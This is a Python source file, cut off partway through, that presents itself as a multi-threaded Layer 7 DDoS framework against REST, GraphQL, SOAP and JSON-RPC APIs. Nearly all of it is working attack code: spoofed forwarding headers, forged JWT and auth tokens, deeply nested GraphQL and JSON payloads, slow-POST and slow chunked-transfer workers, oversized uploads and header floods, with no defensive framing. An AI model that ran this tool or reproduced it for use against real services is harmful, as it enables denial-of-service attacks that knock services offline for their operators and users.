#!/usr/bin/env python3
"""
Advanced API & Application DDoS
Multi-Threaded Layer 7 Attack Framework
Targets: REST APIs, GraphQL, Microservices, Applications
"""

import socket
import ssl
import threading
import random
import time
import sys
import os
import struct
import hashlib
import hmac
import base64
import json
import queue
import signal
import traceback
import ipaddress
import re
import http.client
import urllib.parse
import urllib.request
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor, as_completed
from collections import defaultdict, deque
from datetime import datetime
from enum import Enum
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Tuple, Any
import logging
from logging.handlers import RotatingFileHandler
import zlib
import gzip
from io import BytesIO

# ==================== CONFIGURATION ====================
@dataclass
class EngineConfig:
    debug: bool = False
    log_file: str = "api_ddos.log"
    max_log_size: int = 50 * 1024 * 1024
    backup_count: int = 10
    stealth_mode: bool = False
    adaptive_mode: bool = True
    verify_ssl: bool = False
    timeout: int = 30
    retry_count: int = 3
    jitter: float = 0.1

config = EngineConfig()

# ==================== LOGGING ====================
def setup_logging():
    logger = logging.getLogger('API_DDOS')
    logger.setLevel(logging.DEBUG if config.debug else logging.INFO)
    
    formatter = logging.Formatter(
        '%(asctime)s - [%(levelname)s] - %(threadName)s - %(funcName)s - %(message)s',
        datefmt='%Y-%m-%d %H:%M:%S'
    )
    
    file_handler = RotatingFileHandler(
        config.log_file, 
        maxBytes=config.max_log_size,
        backupCount=config.backup_count
    )
    file_handler.setLevel(logging.DEBUG)
    file_handler.setFormatter(formatter)
    
    console_handler = logging.StreamHandler(sys.stdout)
    console_handler.setLevel(logging.INFO)
    console_handler.setFormatter(logging.Formatter('%(asctime)s - %(message)s', datefmt='%H:%M:%S'))
    
    logger.addHandler(file_handler)
    logger.addHandler(console_handler)
    
    return logger

logger = setup_logging()

# ==================== ENUMS ====================
class AttackVector(Enum):
    API_FLOOD = "api_flood"
    GRAPHQL_FLOOD = "graphql_flood"
    REST_FLOOD = "rest_flood"
    SOAP_FLOOD = "soap_flood"
    JSON_RPC_FLOOD = "json_rpc_flood"
    JWT_BRUTEFORCE = "jwt_bruteforce"
    OAUTH_FLOOD = "oauth_flood"
    HEADER_FLOOD = "header_flood"
    PARAMETER_FLOOD = "parameter_flood"
    NESTED_JSON_FLOOD = "nested_json_flood"
    LARGE_PAYLOAD = "large_payload"
    SLOW_POST = "slow_post"
    CHUNKED_TRANSFER = "chunked_transfer"
    MULTIPART_FLOOD = "multipart_flood"
    URL_ENCODED_FLOOD = "url_encoded_flood"
    MIXED = "mixed"

class AuthType(Enum):
    NONE = "none"
    BASIC = "basic"
    BEARER = "bearer"
    JWT = "jwt"
    API_KEY = "api_key"
    OAUTH2 = "oauth2"
    HMAC = "hmac"
    CUSTOM = "custom"

# ==================== PAYLOAD DATABASE ====================
class PayloadDatabase:
    def __init__(self):
        self.api_endpoints = [
            "/api/v1/users", "/api/v1/auth/login", "/api/v1/auth/register",
            "/api/v1/products", "/api/v1/orders", "/api/v1/search",
            "/api/v1/admin/users", "/api/v1/admin/settings",
            "/api/v2/users", "/api/v2/auth/token", "/api/v2/data",
            "/api/graphql", "/api/rest", "/api/soap",
            "/api/v1/upload", "/api/v1/download", "/api/v1/export",
            "/api/v1/webhook", "/api/v1/callback", "/api/v1/notifications",
            "/api/v1/payments", "/api/v1/transactions", "/api/v1/invoices",
            "/api/v1/dashboard", "/api/v1/analytics", "/api/v1/reports",
            "/api/v1/files", "/api/v1/media", "/api/v1/documents",
            "/api/v1/messages", "/api/v1/chat", "/api/v1/comments",
            "/api/v1/ratings", "/api/v1/reviews", "/api/v1/feedback",
            "/api/v1/subscriptions", "/api/v1/billing", "/api/v1/plans",
            "/api/v1/inventory", "/api/v1/catalog", "/api/v1/categories",
            "/api/v1/tags", "/api/v1/metadata", "/api/v1/config",
            "/api/v1/health", "/api/v1/status", "/api/v1/ping",
            "/api/v1/metrics", "/api/v1/logs", "/api/v1/events",
            "/graphql", "/v1/graphql", "/v2/graphql",
            "/api/soap", "/api/jsonrpc", "/api/rest/v1",
            "/api/private", "/api/internal", "/api/external",
            "/api/mobile", "/api/desktop", "/api/iot",
            "/api/v1/batch", "/api/v1/bulk", "/api/v1/sync",
            "/api/v1/import", "/api/v1/validate", "/api/v1/verify",
            "/api/v1/generate", "/api/v1/process", "/api/v1/execute"
        ]
        
        self.graphql_queries = [
            # Introspection
            """
            query Introspection {
              __schema {
                types { name fields { name type { name kind } } }
                queryType { fields { name args { name type { name kind } } } }
                mutationType { fields { name } }
                subscriptionType { fields { name } }
              }
            }
            """,
            # Deep nested query
            """
            query DeepQuery {
              users {
                id name email posts { id title comments { id text user { id name friends { id name posts { id title } } } } }
                followers { id name posts { id title } }
                following { id name }
                albums { id title photos { id url metadata { size format } } }
              }
            }
            """,
            # Aliased query
            """
            query AliasedQuery {
              u1: users(id: 1) { id name }
              u2: users(id: 2) { id name }
              u3: users(id: 3) { id name }
              u4: users(id: 4) { id name }
              u5: users(id: 5) { id name }
            }
            """,
            # Fragment spread
            """
            query FragmentQuery {
              users {
                ...UserFields
                posts { ...PostFields }
              }
            }
            fragment UserFields on User { id name email avatar }
            fragment PostFields on Post { id title body createdAt }
            """,
            # Complex mutation
            """
            mutation ComplexMutation($input: UserInput!) {
              createUser(input: $input) {
                user { id name email }
                errors { field message }
              }
              updateSettings(input: $input) {
                success
              }
            }
            """,
            # Subscription-like query
            """
            query SubscriptionQuery {
              userUpdates {
                id type data { field1 field2 }
                timestamp
              }
            }
            """
        ]
        
        self.rest_methods = ["GET", "POST", "PUT", "PATCH", "DELETE", "HEAD", "OPTIONS"]
        
        self.content_types = [
            "application/json",
            "application/xml",
            "application/x-www-form-urlencoded",
            "multipart/form-data",
            "text/plain",
            "application/graphql",
            "application/soap+xml",
            "application/json-rpc"
        ]
        
        self.auth_tokens = []
        self.api_keys = []
        
    def generate_random_json(self, depth=3, width=5):
        """Generate random nested JSON payload"""
        if depth <= 0:
            return random.choice([
                self.random_string(10),
                random.randint(1, 10000),
                random.random() * 1000,
                True,
                False,
                None
            ])
        
        if random.choice([True, False]):
            obj = {}
            for _ in range(random.randint(1, width)):
                key = self.random_string(8)
                obj[key] = self.generate_random_json(depth - 1, width)
            return obj
        else:
            arr = []
            for _ in range(random.randint(1, width)):
                arr.append(self.generate_random_json(depth - 1, width))
            return arr
    
    def generate_large_json(self, target_size_mb=10):
        """Generate extremely large JSON payload"""
        data = {
            "data": {
                "items": []
            }
        }
        
        item_template = {
            "id": 0,
            "name": "A" * 1000,
            "description": "B" * 5000,
            "metadata": {
                "tags": ["tag1", "tag2", "tag3"] * 10,
                "attributes": {f"attr_{i}": f"value_{i}" for i in range(100)}
            }
        }
        
        current_size = len(json.dumps(data))
        while current_size < target_size_mb * 1024 * 1024:
            data["data"]["items"].append(item_template.copy())
            current_size = len(json.dumps(data))
        
        return json.dumps(data)
    
    def generate_graphql_variables(self, depth=2):
        """Generate random GraphQL variables"""
        return self.generate_random_json(depth, 3)
    
    def generate_soap_envelope(self):
        """Generate SOAP request envelope"""
        return f"""<?xml version="1.0" encoding="UTF-8"?>
        <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
          <soap:Header>
            <auth:Authentication xmlns:auth="http://auth.example.com">
              <auth:Token>{self.random_string(64)}</auth:Token>
            </auth:Authentication>
          </soap:Header>
          <soap:Body>
            <ns:ProcessData xmlns:ns="http://service.example.com">
              <ns:request>
                <ns:data>{self.generate_random_json(2)}</ns:data>
                <ns:filters>{self.generate_random_json(1)}</ns:filters>
              </ns:request>
            </ns:ProcessData>
          </soap:Body>
        </soap:Envelope>"""
    
    def generate_jsonrpc_request(self):
        """Generate JSON-RPC 2.0 request"""
        methods = [
            "user.create", "user.update", "user.delete",
            "data.process", "data.query", "data.export",
            "service.restart", "service.status", "service.config",
            "system.info", "system.stats", "system.logs"
        ]
        
        return {
            "jsonrpc": "2.0",
            "method": random.choice(methods),
            "params": self.generate_random_json(2),
            "id": random.randint(1, 1000000)
        }
    
    def generate_jwt_token(self):
        """Generate fake JWT token"""
        header = base64.urlsafe_b64encode(json.dumps({
            "alg": random.choice(["HS256", "HS384", "HS512", "RS256"]),
            "typ": "JWT"
        }).encode()).decode().rstrip("=")
        
        payload = base64.urlsafe_b64encode(json.dumps({
            "sub": str(random.randint(1000000, 9999999)),
            "name": self.random_string(8),
            "iat": int(time.time()),
            "exp": int(time.time()) + 3600,
            "role": random.choice(["user", "admin", "moderator"])
        }).encode()).decode().rstrip("=")
        
        signature = base64.urlsafe_b64encode(
            hashlib.sha256(f"{header}.{payload}.{self.random_string(32)}".encode()).digest()
        ).decode().rstrip("=")
        
        return f"{header}.{payload}.{signature}"
    
    def random_string(self, length=10):
        chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-'
        return ''.join(random.choice(chars) for _ in range(length))
    
    def random_ip(self):
        return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"

# ==================== REQUEST BUILDER ====================
class RequestBuilder:
    def __init__(self, target_host, target_port, use_ssl=False):
        self.target_host = target_host
        self.target_port = target_port
        self.use_ssl = use_ssl
        self.payload_db = PayloadDatabase()
        
    def build_headers(self, auth_type=AuthType.NONE, auth_token=None):
        headers = {
            "Host": self.target_host if self.target_port in [80, 443] else f"{self.target_host}:{self.target_port}",
            "User-Agent": random.choice([
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "python-requests/2.28.0", "axios/1.2.0",
                "curl/7.88.0", "PostmanRuntime/7.29.0",
                "okhttp/4.10.0", "RestSharp/108.0.2"
            ]),
            "Accept": random.choice([
                "application/json", "application/xml",
                "application/graphql+json", "*/*"
            ]),
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": random.choice([
                "en-US,en;q=0.9", "ru-RU,ru;q=0.9",
                "zh-CN,zh;q=0.9", "ja-JP,ja;q=0.9"
            ]),
            "Cache-Control": "no-cache",
            "Connection": "keep-alive",
            "X-Forwarded-For": self.payload_db.random_ip(),
            "X-Real-IP": self.payload_db.random_ip(),
            "X-Request-ID": self.payload_db.random_string(36),
            "X-Correlation-ID": self.payload_db.random_string(36),
            "X-Trace-ID": self.payload_db.random_string(32),
        }
        
        # Add authentication
        if auth_type == AuthType.BEARER and auth_token:
            headers["Authorization"] = f"Bearer {auth_token}"
        elif auth_type == AuthType.BASIC:
            credentials = base64.b64encode(f"{self.payload_db.random_string(8)}:{self.payload_db.random_string(16)}".encode()).decode()
            headers["Authorization"] = f"Basic {credentials}"
        elif auth_type == AuthType.API_KEY:
            headers["X-API-Key"] = self.payload_db.random_string(32)
        elif auth_type == AuthType.JWT:
            headers["Authorization"] = f"Bearer {self.payload_db.generate_jwt_token()}"
        elif auth_type == AuthType.HMAC:
            timestamp = str(int(time.time()))
            signature = hmac.new(
                self.payload_db.random_string(16).encode(),
                f"{timestamp}{self.payload_db.random_string(20)}".encode(),
                hashlib.sha256
            ).hexdigest()
            headers["X-Auth-Timestamp"] = timestamp
            headers["X-Auth-Signature"] = signature
        
        return headers
    
    def build_rest_request(self, method, path, body=None, auth_type=AuthType.NONE, auth_token=None):
        headers = self.build_headers(auth_type, auth_token)
        
        if body and isinstance(body, dict):
            body = json.dumps(body)
            headers["Content-Type"] = "application/json"
        elif body and isinstance(body, str):
            headers["Content-Type"] = "text/plain"
        
        if body:
            headers["Content-Length"] = str(len(body))
        
        request_line = f"{method} {path} HTTP/1.1\r\n"
        header_lines = "\r\n".join([f"{k}: {v}" for k, v in headers.items()])
        
        request = f"{request_line}{header_lines}\r\n\r\n"
        if body:
            request += body
        
        return request.encode()
    
    def build_graphql_request(self, query=None, variables=None):
        if not query:
            query = random.choice(self.payload_db.graphql_queries)
        
        if not variables:
            variables = self.payload_db.generate_graphql_variables()
        
        body = json.dumps({
            "query": query,
            "variables": variables,
            "operationName": self.payload_db.random_string(10)
        })
        
        headers = self.build_headers(auth_type=AuthType.BEARER, 
                                     auth_token=self.payload_db.generate_jwt_token())
        headers["Content-Type"] = "application/json"
        headers["Content-Length"] = str(len(body))
        
        request_line = f"POST /graphql HTTP/1.1\r\n"
        header_lines = "\r\n".join([f"{k}: {v}" for k, v in headers.items()])
        
        return f"{request_line}{header_lines}\r\n\r\n{body}".encode()
    
    def build_soap_request(self):
        body = self.payload_db.generate_soap_envelope()
        
        headers = self.build_headers()
        headers["Content-Type"] = "application/soap+xml"
        headers["SOAPAction"] = f"\"http://service.example.com/{self.payload_db.random_string(10)}\""
        headers["Content-Length"] = str(len(body))
        
        request_line = f"POST /api/soap HTTP/1.1\r\n"
        header_lines = "\r\n".join([f"{k}: {v}" for k, v in headers.items()])
        
        return f"{request_line}{header_lines}\r\n\r\n{body}".encode()
    
    def build_jsonrpc_request(self):
        body = json.dumps(self.payload_db.generate_jsonrpc_request())
        
        headers = self.build_headers()
        headers["Content-Type"] = "application/json"
        headers["Content-Length"] = str(len(body))
        
        request_line = f"POST /api/jsonrpc HTTP/1.1\r\n"
        header_lines = "\r\n".join([f"{k}: {v}" for k, v in headers.items()])
        
        return f"{request_line}{header_lines}\r\n\r\n{body}".encode()
    
    def build_slow_post_request(self):
        content_length = random.randint(5000000, 50000000)  # 5-50MB
        
        headers = self.build_headers()
        headers["Content-Type"] = "application/json"
        headers["Content-Length"] = str(content_length)
        
        request_line = f"POST {random.choice(self.payload_db.api_endpoints)} HTTP/1.1\r\n"
        header_lines = "\r\n".join([f"{k}: {v}" for k, v in headers.items()])
        
        return f"{request_line}{header_lines}\r\n\r\n".encode(), content_length
    
    def build_chunked_request(self):
        headers = self.build_headers()
        headers["Transfer-Encoding"] = "chunked"
        headers["Content-Type"] = "application/json"
        
        request_line = f"POST {random.choice(self.payload_db.api_endpoints)} HTTP/1.1\r\n"
        header_lines = "\r\n".join([f"{k}: {v}" for k, v in headers.items()])
        
        return f"{request_line}{header_lines}\r\n\r\n".encode()
    
    def build_multipart_request(self):
        boundary = f"----FormBoundary{self.payload_db.random_string(16)}"
        
        parts = []
        for _ in range(random.randint(5, 20)):
            field_name = self.payload_db.random_string(8)
            field_value = self.payload_db.random_string(random.randint(100, 10000))
            part = (
                f"--{boundary}\r\n"
                f"Content-Disposition: form-data; name=\"{field_name}\"\r\n\r\n"
                f"{field_value}\r\n"
            )
            parts.append(part)
        
        parts.append(f"--{boundary}--\r\n")
        body = "".join(parts)
        
        headers = self.build_headers()
        headers["Content-Type"] = f"multipart/form-data; boundary={boundary}"
        headers["Content-Length"] = str(len(body))
        
        request_line = f"POST {random.choice(self.payload_db.api_endpoints)} HTTP/1.1\r\n"
        header_lines = "\r\n".join([f"{k}: {v}" for k, v in headers.items()])
        
        return f"{request_line}{header_lines}\r\n\r\n{body}".encode()

# ==================== CONNECTION MANAGER ====================
class ConnectionManager:
    def __init__(self, host, port, use_ssl=False, pool_size=100):
        self.host = host
        self.port = port
        self.use_ssl = use_ssl
        self.pool_size = pool_size
        self.pool = queue.Queue(maxsize=pool_size)
        self.lock = threading.Lock()
        self.created = 0
        
    def create_connection(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            sock.settimeout(config.timeout)
            sock.connect((self.host, self.port))
            
            if self.use_ssl:
                context = ssl.create_default_context()
                context.check_hostname = config.verify_ssl
                context.verify_mode = ssl.CERT_REQUIRED if config.verify_ssl else ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=self.host)
            
            with self.lock:
                self.created += 1
            
            return sock
        except Exception as e:
            logger.debug(f"Connection creation failed: {e}")
            return None
    
    def get_connection(self):
        try:
            return self.pool.get_nowait()
        except queue.Empty:
            if self.created < self.pool_size:
                return self.create_connection()
            return None
    
    def return_connection(self, conn):
        if conn:
            try:
                self.pool.put_nowait(conn)
            except queue.Full:
                try:
                    conn.close()
                except:
                    pass
                with self.lock:
                    self.created -= 1
    
    def close_all(self):
        while not self.pool.empty():
            try:
                conn = self.pool.get_nowait()
                conn.close()
            except:
                pass

# ==================== STATISTICS ====================
class Statistics:
    def __init__(self):
        self.stats = defaultdict(int)
        self.lock = threading.Lock()
        self.start_time = time.time()
        self.response_times = deque(maxlen=10000)
        self.http_codes = defaultdict(int)
        
    def record_success(self, vector, response_time=None, status_code=None):
        with self.lock:
            self.stats[f'{vector}_success'] += 1
            self.stats['total_success'] += 1
            if response_time:
                self.response_times.append(response_time)
            if status_code:
                self.http_codes[str(status_code)] += 1
    
    def record_failure(self, vector, error_type):
        with self.lock:
            self.stats[f'{vector}_failure'] += 1
            self.stats['total_failure'] += 1
            self.stats[f'error_{error_type}'] += 1
    
    def get_summary(self):
        with self.lock:
            elapsed = time.time() - self.start_time
            total = self.stats['total_success'] + self.stats['total_failure']
            rate = total / elapsed if elapsed > 0 else 0
            
            avg_rt = 0
            if self.response_times:
                avg_rt = sum(self.response_times) / len(self.response_times)
            
            return {
                'elapsed': elapsed,
                'total_requests': total,
                'successful': self.stats['total_success'],
                'failed': self.stats['total_failure'],
                'rate': rate,
                'avg_response_time': avg_rt,
                'http_codes': dict(self.http_codes)
            }

# ==================== ATTACK EXECUTORS ====================
class AttackExecutor:
    def __init__(self, target, port, use_ssl=False, threads=500, duration=60):
        self.target = target
        self.port = port
        self.use_ssl = use_ssl
        self.threads = threads
        self.duration = duration
        self.running = True
        self.stats = Statistics()
        self.connection_pool = ConnectionManager(target, port, use_ssl, pool_size=threads)
        self.request_builder = RequestBuilder(target, port, use_ssl)
        
    def _send_and_receive(self, sock, request, timeout=5):
        try:
            sock.settimeout(timeout)
            start = time.time()
            sock.sendall(request)
            
            response = b""
            while True:
                try:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    response += chunk
                    if len(response) > 65536:  # 64KB max
                        break
                except socket.timeout:
                    break
            
            response_time = time.time() - start
            
            # Parse status code
            status_code = None
            try:
                status_line = response.split(b'\r\n')[0].decode()
                status_code = int(status_line.split(' ')[1])
            except:
                pass
            
            return True, response_time, status_code, len(response)
        except Exception as e:
            return False, 0, None, 0
    
    def _test_target(self):
        """Test if target is reachable and responding"""
        logger.info(f"[*] Testing target reachability: {self.target}:{self.port}")
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            result = sock.connect_ex((self.target, self.port))
            sock.close()
            
            if result == 0:
                logger.info(f"[+] Target {self.target}:{self.port} is reachable")
                
                # Test HTTP response
                try:
                    test_request = self.request_builder.build_rest_request("GET", "/")
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(5)
                    sock.connect((self.target, self.port))
                    
                    if self.use_ssl:
                        context = ssl.create_default_context()
                        context.check_hostname = False
                        context.verify_mode = ssl.CERT_NONE
                        sock = context.wrap_socket(sock, server_hostname=self.target)
                    
                    sock.send(test_request)
                    response = sock.recv(4096)
                    sock.close()
                    
                    status = response.split(b'\r\n')[0].decode()
                    logger.info(f"[+] Target responded: {status}")
                    return True
                except Exception as e:
                    logger.warning(f"[!] Target reachable but HTTP test failed: {e}")
                    return True
            else:
                logger.error(f"[-] Target NOT reachable (error: {result})")
                return False
        except Exception as e:
            logger.error(f"[-] Reachability test failed: {e}")
            return False
    
    def _rest_flood_worker(self, thread_id):
        """REST API flood worker"""
        consecutive_errors = 0
        max_errors = 50
        
        while self.running and consecutive_errors < max_errors:
            try:
                conn = self.connection_pool.get_connection()
                if not conn:
                    conn = self.connection_pool.create_connection()
                
                if not conn:
                    time.sleep(0.01)
                    continue
                
                # Send multiple requests on same connection
                for _ in range(random.randint(1, 20)):
                    if not self.running:
                        break
                    
                    method = random.choice(self.request_builder.payload_db.rest_methods)
                    path = random.choice(self.request_builder.payload_db.api_endpoints)
                    
                    auth_type = random.choice(list(AuthType))
                    body = None
                    
                    if method in ["POST", "PUT", "PATCH"]:
                        if random.choice([True, False]):
                            body = self.request_builder.payload_db.generate_random_json(
                                depth=random.randint(1, 5)
                            )
                    
                    request = self.request_builder.build_rest_request(
                        method, path, body, auth_type
                    )
                    
                    success, rt, status, size = self._send_and_receive(conn, request)
                    
                    if success:
                        self.stats.record_success('rest', rt, status)
                        consecutive_errors = 0
                    else:
                        self.stats.record_failure('rest', 'network_error')
                        consecutive_errors += 1
                        break
                
                self.connection_pool.return_connection(conn)
                
            except Exception as e:
                consecutive_errors += 1
                self.stats.record_failure('rest', type(e).__name__)
                time.sleep(random.uniform(0.01, 0.1 * config.jitter))
    
    def _graphql_flood_worker(self, thread_id):
        """GraphQL API flood worker"""
        consecutive_errors = 0
        
        while self.running and consecutive_errors < 30:
            try:
                conn = self.connection_pool.get_connection()
                if not conn:
                    conn = self.connection_pool.create_connection()
                
                if not conn:
                    time.sleep(0.01)
                    continue
                
                for _ in range(random.randint(1, 10)):
                    if not self.running:
                        break
                    
                    query_type = random.choice(['normal', 'deep', 'aliased', 'fragment'])
                    
                    if query_type == 'normal':
                        query = random.choice(self.request_builder.payload_db.graphql_queries)
                    elif query_type == 'deep':
                        depth = random.randint(5, 15)
                        query = self._generate_deep_query(depth)
                    else:
                        query = random.choice(self.request_builder.payload_db.graphql_queries)
                    
                    request = self.request_builder.build_graphql_request(query=query)
                    success, rt, status, size = self._send_and_receive(conn, request)
                    
                    if success:
                        self.stats.record_success('graphql', rt, status)
                        consecutive_errors = 0
                    else:
                        self.stats.record_failure('graphql', 'network_error')
                        consecutive_errors += 1
                        break
                
                self.connection_pool.return_connection(conn)
                
            except Exception as e:
                consecutive_errors += 1
                self.stats.record_failure('graphql', type(e).__name__)
                time.sleep(random.uniform(0.01, 0.1))
    
    def _generate_deep_query(self, depth):
        """Generate deeply nested GraphQL query"""
        if depth <= 0:
            return "id"
        
        return f"""
        user {{
            id name
            posts {{
                id title
                comments {{
                    id text
                    author {{
                        {self._generate_deep_query(depth - 1)}
                    }}
                }}
            }}
        }}
        """
    
    def _soap_flood_worker(self, thread_id):
        """SOAP API flood worker"""
        consecutive_errors = 0
        
        while self.running and consecutive_errors < 30:
            try:
                conn = self.connection_pool.get_connection()
                if not conn:
                    conn = self.connection_pool.create_connection()
                
                if not conn:
                    time.sleep(0.01)
                    continue
                
                request = self.request_builder.build_soap_request()
                success, rt, status, size = self._send_and_receive(conn, request)
                
                if success:
                    self.stats.record_success('soap', rt, status)
                    consecutive_errors = 0
                else:
                    self.stats.record_failure('soap', 'network_error')
                    consecutive_errors += 1
                
                self.connection_pool.return_connection(conn)
                
            except Exception as e:
                consecutive_errors += 1
                self.stats.record_failure('soap', type(e).__name__)
                time.sleep(0.01)
    
    def _jsonrpc_flood_worker(self, thread_id):
        """JSON-RPC flood worker"""
        consecutive_errors = 0
        
        while self.running and consecutive_errors < 30:
            try:
                conn = self.connection_pool.get_connection()
                if not conn:
                    conn = self.connection_pool.create_connection()
                
                if not conn:
                    time.sleep(0.01)
                    continue
                
                request = self.request_builder.build_jsonrpc_request()
                success, rt, status, size = self._send_and_receive(conn, request)
                
                if success:
                    self.stats.record_success('jsonrpc', rt, status)
                    consecutive_errors = 0
                else:
                    self.stats.record_failure('jsonrpc', 'network_error')
                    consecutive_errors += 1
                
                self.connection_pool.return_connection(conn)
                
            except Exception as e:
                consecutive_errors += 1
                self.stats.record_failure('jsonrpc', type(e).__name__)
                time.sleep(0.01)
    
    def _slow_post_worker(self, thread_id):
        """Slow POST attack worker"""
        while self.running:
            try:
                conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                conn.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                conn.settimeout(10)
                conn.connect((self.target, self.port))
                
                if self.use_ssl:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    conn = context.wrap_socket(conn, server_hostname=self.target)
                
                request, total_size = self.request_builder.build_slow_post_request()
                conn.send(request)
                
                sent = 0
                while sent < total_size and self.running:
                    chunk_size = random.randint(1, 100)
                    chunk = b'{"data":"' + self.request_builder.payload_db.random_string(chunk_size).encode() + b'"}'
                    conn.send(chunk)
                    sent += len(chunk)
                    time.sleep(random.uniform(1, 10))
                
                self.stats.record_success('slow_post')
                conn.close()
                
            except Exception as e:
                self.stats.record_failure('slow_post', type(e).__name__)
                time.sleep(1)
    
    def _chunked_worker(self, thread_id):
        """Chunked transfer encoding attack"""
        while self.running:
            try:
                conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                conn.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                conn.settimeout(10)
                conn.connect((self.target, self.port))
                
                if self.use_ssl:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    conn = context.wrap_socket(conn, server_hostname=self.target)
                
                request = self.request_builder.build_chunked_request()
                conn.send(request)
                
                for _ in range(random.randint(100, 1000)):
                    if not self.running:
                        break
                    
                    chunk = self.request_builder.payload_db.random_string(random.randint(10, 1000))
                    chunk_header = f"{len(chunk):X}\r\n"
                    chunk_data = f"{chunk}\r\n"
                    conn.send(chunk_header.encode() + chunk_data.encode())
                    time.sleep(random.uniform(0.01, 1))
                
                conn.send(b"0\r\n\r\n")
                self.stats.record_success('chunked')
                conn.close()
                
            except Exception as e:
                self.stats.record_failure('chunked', type(e).__name__)
                time.sleep(0.1)
    
    def _nested_json_worker(self, thread_id):
        """Deeply nested JSON flood"""
        consecutive_errors = 0
        
        while self.running and consecutive_errors < 30:
            try:
                conn = self.connection_pool.get_connection()
                if not conn:
                    conn = self.connection_pool.create_connection()
                
                if not conn:
                    time.sleep(0.01)
                    continue
                
                depth = random.randint(10, 50)
                payload = self.request_builder.payload_db.generate_random_json(depth, 10)
                body = json.dumps(payload)
                
                request = self.request_builder.build_rest_request("POST", "/api/v1/data", body)
                success, rt, status, size = self._send_and_receive(conn, request)
                
                if success:
                    self.stats.record_success('nested_json', rt, status)
                    consecutive_errors = 0
                else:
                    self.stats.record_failure('nested_json', 'network_error')
                    consecutive_errors += 1
                
                self.connection_pool.return_connection(conn)
                
            except Exception as e:
                consecutive_errors += 1
                self.stats.record_failure('nested_json', type(e).__name__)
                time.sleep(0.01)
    
    def _large_payload_worker(self, thread_id):
        """Large payload flood"""
        consecutive_errors = 0
        
        while self.running and consecutive_errors < 20:
            try:
                conn = self.connection_pool.get_connection()
                if not conn:
                    conn = self.connection_pool.create_connection()
                
                if not conn:
                    time.sleep(0.01)
                    continue
                
                size_mb = random.uniform(0.1, 5)
                body = self.request_builder.payload_db.generate_large_json(size_mb)
                
                request = self.request_builder.build_rest_request("POST", "/api/v1/upload", body)
                success, rt, status, size = self._send_and_receive(conn, request, timeout=30)
                
                if success:
                    self.stats.record_success('large_payload', rt, status)
                    consecutive_errors = 0
                else:
                    self.stats.record_failure('large_payload', 'network_error')
                    consecutive_errors += 1
                
                self.connection_pool.return_connection(conn)
                
            except Exception as e:
                consecutive_errors += 1
                self.stats.record_failure('large_payload', type(e).__name__)
                time.sleep(0.1)
    
    def _multipart_worker(self, thread_id):
        """Multipart form-data flood"""
        consecutive_errors = 0
        
        while self.running and consecutive_errors < 30:
            try:
                conn = self.connection_pool.get_connection()
                if not conn:
                    conn = self.connection_pool.create_connection()
                
                if not conn:
                    time.sleep(0.01)
                    continue
                
                request = self.request_builder.build_multipart_request()
                success, rt, status, size = self._send_and_receive(conn, request, timeout=15)
                
                if success:
                    self.stats.record_success('multipart', rt, status)
                    consecutive_errors = 0
                else:
                    self.stats.record_failure('multipart', 'network_error')
                    consecutive_errors += 1
                
                self.connection_pool.return_connection(conn)
                
            except Exception as e:
                consecutive_errors += 1
                self.stats.record_failure('multipart', type(e).__name__)
                time.sleep(0.01)
    
    def _header_flood_worker(self, thread_id):
        """Header flood - excessive headers"""
        consecutive_errors = 0
        
        while self.running and consecutive_errors < 30:
            try:
                conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                conn.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                conn.settimeout(10)
                conn.connect((self.target, self.port))
                
                if self.use_ssl:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    conn = context.wrap_socket(conn, server_hostname=self.target)
                
                # Generate request with hundreds of custom headers
                headers = self.request_builder.build_headers()
                for i in range(random.randint(100, 1000)):
                    headers[f"X-Custom-{i}-{self.request_builder.payload_db.random_string(5)}"] = \
                        self.request_builder.payload_db.random_string(random.randint(10, 100))
                
                host = self.target if self.port in [80, 443] else f"{self.target}:{self.port}"
                request_line = f"GET {random.choice(self.request_builder.payload_db.api_endpoints)} HTTP/1.1\r\n"
                header_lines = "\r\n".join([f"{k}: {v}" for k, v in headers.items()])
                request = f"{request_line}{header_lines}\r\n\r\n"
                
                conn.send(request.encode())
                
                try:
                    conn.settimeout(5)
                    response = conn.recv(4096)
                    if response:
                        self.stats.record_success('header_flood')
                        consecutive_errors = 0
                except:
                    self.stats.record_failure('header_flood', 'timeout')
                    consecutive_errors += 1
                
                conn.close()
                
            except Exception as e:
                consecutive_errors += 1
                self.stats.record_failure('header_flood', type(e).__name__)
                time.sleep(0.01)
    
    def _parameter_flood_worker(self, thread_id):
        """URL parameter flood"""
        consecutive_errors = 0
        
        while self.running and consecutive_errors < 30:
            try:
                conn = self.connection_pool.get_connection()
                if not conn:
                    conn = self.connection_pool.create_connection()
                
                if not conn:
                    time.sleep(0.01)
                    continue
                
                # Generate URL with thousands of parameters
                base_path = random.choice(self.request_builder.payload_db.api_endpoints)
                params = {}
                for _ in range(random.randint(100, 500)):
                    params[self.request_builder.payload_db.random_string(10)] = \
                        self.request_builder.payload_db.random_string(20)
                
